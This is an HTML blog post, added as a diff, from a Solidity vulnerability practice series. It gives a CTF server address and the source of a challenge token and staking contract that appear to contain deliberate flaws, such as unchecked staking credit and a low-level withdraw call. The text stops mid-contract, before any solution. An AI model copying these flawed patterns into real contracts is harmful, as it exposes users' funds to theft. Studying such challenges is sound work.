@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="practice">
+<meta property="og:type" content="article">
+<meta property="og:title" content="solidity漏洞实践（二）">
+<meta property="og:url" content="http://example.com/2022/12/01/solidity%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%BA%8C%EF%BC%89/index.html">
+<meta property="og:site_name" content="lucifer&#39;s blog">
+<meta property="og:description" content="practice">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-12-01T06:37:48.000Z">
+<meta property="article:modified_time" content="2022-12-01T07:22:01.660Z">
+<meta property="article:author" content="lucifer">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/12/01/solidity%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%BA%8C%EF%BC%89/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>solidity漏洞实践（二） | lucifer's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">lucifer's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="download fa-fw"></i>资源</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/01/solidity%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%BA%8C%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lucifer">
+      <meta itemprop="description" content="我的老婆严菡是猪">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lucifer's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          solidity漏洞实践（二）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-12-01 14:37:48 / 修改时间：15:22:01" itemprop="dateCreated datePublished" datetime="2022-12-01T14:37:48+08:00">2022-12-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/contest/" itemprop="url" rel="index"><span itemprop="name">contest</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>16k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>15 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>practice<br> <span id="more"></span><br>1.nc 1.15.39.10 10001<br>源码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.12</span>;</span><br><span class="line">pragma experimental <span class="title class_">ABIEncoderV</span>2;</span><br><span class="line">library <span class="title class_">SafeMath</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">uint256 a, uint256 b</span>) internal pure returns (uint256) &#123;</span><br><span class="line">        uint256 c = a + b;</span><br><span class="line">        <span class="built_in">require</span>(c &gt;= a, <span class="string">&quot;SafeMath: addition overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sub</span>(<span class="params">uint256 a, uint256 b</span>) internal pure returns (uint256) &#123;</span><br><span class="line">        <span class="built_in">require</span>(b &lt;= a, <span class="string">&quot;SafeMath: subtraction overflow&quot;</span>);</span><br><span class="line">        uint256 c = a - b;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">mul</span>(<span class="params">uint256 a, uint256 b</span>) internal pure returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 c = a * b;</span><br><span class="line">        <span class="built_in">require</span>(c / a == b, <span class="string">&quot;SafeMath: multiplication overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">div</span>(<span class="params">uint256 a, uint256 b</span>) internal pure returns (uint256) &#123;</span><br><span class="line">        <span class="built_in">require</span>(b &gt; <span class="number">0</span>, <span class="string">&quot;SafeMath: division by zero&quot;</span>);</span><br><span class="line">        uint256 c = a / b;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">mod</span>(<span class="params">uint256 a, uint256 b</span>) internal pure returns (uint256) &#123;</span><br><span class="line">        <span class="built_in">require</span>(b != <span class="number">0</span>, <span class="string">&quot;SafeMath: modulo by zero&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> a % b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract <span class="title class_">ERC20</span> &#123;</span><br><span class="line">    using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line"></span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256) public _balances;</span><br><span class="line"></span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256)) public _allowances;</span><br><span class="line"></span><br><span class="line">    string public _name;</span><br><span class="line">    string public _symbol;</span><br><span class="line">    uint8 public _decimals;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span> (string memory name, string memory symbol) public &#123;</span><br><span class="line">        _name = name;</span><br><span class="line">        _symbol = symbol;</span><br><span class="line">        _decimals = <span class="number">18</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address account</span>) public view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address recipient, uint256 amount</span>) public virtual returns (bool) &#123;</span><br><span class="line">        <span class="title function_">_transfer</span>(msg.<span class="property">sender</span>, recipient, amount);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address spender, uint256 amount</span>) public virtual returns (bool) &#123;</span><br><span class="line">        <span class="title function_">_approve</span>(msg.<span class="property">sender</span>, spender, amount);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferFrom</span>(<span class="params">address sender, address recipient, uint256 amount</span>) public virtual returns (bool) &#123;</span><br><span class="line">        <span class="title function_">_transfer</span>(sender, recipient, amount);</span><br><span class="line">        <span class="title function_">_approve</span>(sender, msg.<span class="property">sender</span>, _allowances[sender][msg.<span class="property">sender</span>].<span class="title function_">sub</span>(amount));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_transfer</span>(<span class="params">address sender, address recipient, uint256 amount</span>) internal virtual &#123;</span><br><span class="line">        <span class="built_in">require</span>(sender != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;ERC20: transfer from the zero address&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(recipient != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;ERC20: transfer to the zero address&quot;</span>);</span><br><span class="line"></span><br><span class="line">        _balances[sender] = _balances[sender].<span class="title function_">sub</span>(amount);</span><br><span class="line">        _balances[recipient] = _balances[recipient].<span class="title function_">add</span>(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_mint</span>(<span class="params">address account, uint256 amount</span>) internal virtual &#123;</span><br><span class="line">        <span class="built_in">require</span>(account != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;ERC20: mint to the zero address&quot;</span>);</span><br><span class="line">        _balances[account] = _balances[account].<span class="title function_">add</span>(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_burn</span>(<span class="params">address account, uint256 amount</span>) internal virtual &#123;</span><br><span class="line">        <span class="built_in">require</span>(account != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;ERC20: burn from the zero address&quot;</span>);</span><br><span class="line">        _balances[account] = _balances[account].<span class="title function_">sub</span>(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_approve</span>(<span class="params">address owner, address spender, uint256 amount</span>) internal virtual &#123;</span><br><span class="line">        <span class="built_in">require</span>(owner != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;ERC20: approve from the zero address&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(spender != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;ERC20: approve to the zero address&quot;</span>);</span><br><span class="line">        _allowances[owner][spender] = amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="variable constant_">ZT</span> is <span class="title class_">ERC20</span>(<span class="string">&quot;ZERO TOKEN&quot;</span>, <span class="string">&quot;ZT&quot;</span>)&#123;</span><br><span class="line">    <span class="comment">//RULE 1</span></span><br><span class="line">    bytes32 constant <span class="variable constant_">RULE_WITHDRAW_WANT</span> = <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(<span class="string">&quot;withdraw&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//RULE 2</span></span><br><span class="line">    bytes32 constant <span class="variable constant_">RULE_NONE_WANT</span> = <span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(<span class="string">&quot;depositByValue&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        <span class="title function_">_mint</span>(msg.<span class="property">sender</span>,<span class="number">10000000</span>*<span class="number">10</span>**<span class="number">18</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">depositByWant</span>(<span class="params">uint _amount</span>)external payable&#123;</span><br><span class="line">        uint amount = _amount.<span class="title function_">mul</span>(<span class="number">10</span>**<span class="number">18</span>);</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span>&gt;=amount,<span class="string">&quot;you want to trick me?&quot;</span>);</span><br><span class="line">        <span class="title class_">MkaheChange</span>(msg.<span class="property">sender</span>,amount,<span class="variable constant_">RULE_NONE_WANT</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint _amount</span>)external payable <span class="title function_">returns</span>(<span class="params">bool</span>)&#123;</span><br><span class="line">        uint amount = _amount.<span class="title function_">mul</span>(<span class="number">10</span>**<span class="number">18</span>);</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">balanceOf</span>(msg.<span class="property">sender</span>)&gt;=amount);</span><br><span class="line">        _balances[msg.<span class="property">sender</span>] = _balances[msg.<span class="property">sender</span>].<span class="title function_">sub</span>(amount);</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">MkaheChange</span>(msg.<span class="property">sender</span>,amount,<span class="variable constant_">RULE_WITHDRAW_WANT</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">MkaheChange</span>(<span class="params">address to,uint amount,bytes32 ID</span>)internal <span class="title function_">returns</span>(<span class="params">bool</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable constant_">ID</span>==<span class="variable constant_">RULE_NONE_WANT</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            _balances[msg.<span class="property">sender</span>]=_balances[msg.<span class="property">sender</span>].<span class="title function_">add</span>(amount);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable constant_">ID</span>==<span class="variable constant_">RULE_WITHDRAW_WANT</span>)&#123;</span><br><span class="line">            bool a;</span><br><span class="line">            (a,)=<span class="title function_">payable</span>(to).<span class="property">call</span>.<span class="title function_">value</span>(amount)(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="built_in">require</span>(a,<span class="string">&quot;withdraw fail&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">fallback</span>()external payable&#123;</span><br><span class="line">        <span class="title class_">MkaheChange</span>(</span><br><span class="line">            msg.<span class="property">sender</span>,</span><br><span class="line">            msg.<span class="property">value</span>,</span><br><span class="line">            <span class="variable constant_">RULE_NONE_WANT</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract <span class="title class_">ZTstakepool</span>&#123;</span><br><span class="line">    <span class="variable constant_">ZT</span> token;</span><br><span class="line">    uint  totalsupply;</span><br><span class="line">    string symbol;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span>=&gt;</span>uint)internal workbalance;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span>=&gt;</span>bool)internal passed;</span><br><span class="line"></span><br><span class="line">    struct userInfo&#123;</span><br><span class="line">        uint amount;</span><br><span class="line">        uint duration;</span><br><span class="line">        uint startTime;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span>=&gt;</span>userInfo)internal userDetails;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        token =<span class="keyword">new</span> <span class="title function_">ZT</span>();</span><br><span class="line">        symbol = <span class="string">&quot;stTGT&quot;</span>;</span><br><span class="line">        totalsupply = token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getDetails</span>(<span class="params">address account</span>)public view <span class="title function_">returns</span>(<span class="params">userInfo memory</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> userDetails[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">workBalanceOf</span>(<span class="params">address account</span>)public view <span class="title function_">returns</span>(<span class="params">uint</span>)&#123;</span><br><span class="line">        bool pass=passed[account];</span><br><span class="line">        <span class="keyword">if</span>(pass)&#123;</span><br><span class="line">            <span class="keyword">return</span> workbalance[account];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">Zt</span>(<span class="params"></span>)public view <span class="title function_">returns</span>(<span class="params">address</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">stake</span>(<span class="params">uint amount,uint blocknumber</span>)external&#123;</span><br><span class="line">        <span class="built_in">require</span>(blocknumber&gt;=<span class="number">1</span>,<span class="string">&quot;At least 1 block&quot;</span>);</span><br><span class="line"></span><br><span class="line">        userInfo storage user = userDetails[msg.<span class="property">sender</span>];</span><br><span class="line"></span><br><span class="line">        user.<span class="property">startTime</span> = block.<span class="property">number</span>;</span><br><span class="line">        user.<span class="property">duration</span> = blocknumber;</span><br><span class="line">        user.<span class="property">amount</span> += amount;</span><br><span class="line"></span><br><span class="line">        token.<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>,<span class="title function_">address</span>(<span class="variable language_">this</span>),amount*<span class="number">10</span>**<span class="number">18</span>);</span><br><span class="line">        workbalance[msg.<span class="property">sender</span>] += blocknumber;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">unstake</span>(<span class="params"></span>)external&#123;</span><br><span class="line">        userInfo storage user = userDetails[msg.<span class="property">sender</span>];</span><br><span class="line">        <span class="built_in">require</span>(block.<span class="property">number</span>&gt;=user.<span class="property">startTime</span>+user.<span class="property">duration</span>,<span class="string">&quot;you are in a hurry &quot;</span>);</span><br><span class="line">        passed[msg.<span class="property">sender</span>] = <span class="literal">true</span>;</span><br><span class="line">        uint amount = user.<span class="property">amount</span>;</span><br><span class="line">        user.<span class="property">amount</span> = <span class="number">0</span>;</span><br><span class="line">        token.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>,amount*<span class="number">10</span>**<span class="number">18</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">swap</span>(<span class="params">address <span class="keyword">from</span>,address to,uint amount</span>)external&#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="keyword">from</span>==<span class="title function_">address</span>(<span class="variable language_">this</span>)&amp;&amp;to==<span class="title function_">address</span>(token));</span><br><span class="line">        uint balance = <span class="title function_">workBalanceOf</span>(msg.<span class="property">sender</span>);</span><br><span class="line">        <span class="built_in">require</span>(balance&gt;=amount,<span class="string">&quot;exceed&quot;</span>);</span><br><span class="line">        workbalance[msg.<span class="property">sender</span>] -= amount;</span><br><span class="line">        token.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>,amount*<span class="number">10</span>**<span class="number">18</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract setup&#123;</span><br><span class="line">    <span class="title class_">ZTstakepool</span> public stakePool;</span><br><span class="line">    <span class="variable constant_">ZT</span> public erc20;</span><br><span class="line">    bool solve;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        stakePool =<span class="keyword">new</span> <span class="title class_">ZTstakepool</span>();</span><br><span class="line">        erc20 = <span class="title function_">ZT</span>(<span class="title function_">payable</span>(stakePool.<span class="title class_">Zt</span>()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isSolved</span>(<span class="params"></span>)public view <span class="title function_">returns</span>(<span class="params">bool</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> solve;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">complete</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        <span class="built_in">require</span>(erc20.<span class="title function_">balanceOf</span>(msg.<span class="property">sender</span>)&gt;=<span class="number">500000</span>*<span class="number">10</span>**<span class="number">18</span>);</span><br><span class="line">        solve = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span 